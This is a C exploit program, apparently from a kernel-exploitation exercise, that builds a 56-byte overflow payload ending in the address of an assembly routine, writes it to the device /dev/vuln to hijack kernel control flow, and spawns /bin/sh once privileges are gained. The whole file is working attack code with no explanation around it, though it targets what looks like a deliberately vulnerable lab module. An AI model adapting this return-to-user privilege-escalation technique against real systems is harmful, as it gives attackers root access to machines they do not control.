#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>

#define OFFSET 56
#define LINES 1
#define PAYLOAD_SIZE (OFFSET + LINES * sizeof(unsigned long))

extern void asm_exploit(void);
extern void get_regs(void);

char payload[PAYLOAD_SIZE];


void main(){
    int fd;
	int i;  
	char *p;

    get_regs();

    for (p = payload; p< payload + OFFSET; p++){
        *p = 'A';
    }
    
    // get the address of asm_exploit
    unsigned long a = (unsigned long)asm_exploit;

    memcpy(p, &a, sizeof(a));
    fd = open("/dev/vuln", O_WRONLY);
    if(fd < 0){
        perror("open");
        exit(-1);
    }
    write(fd, payload, sizeof(payload));
    printf("If you see this message, exploit failed!\n");
    close(fd);
    exit(1);
}

void cont(){
    system("/bin/sh");
    _exit(0);
}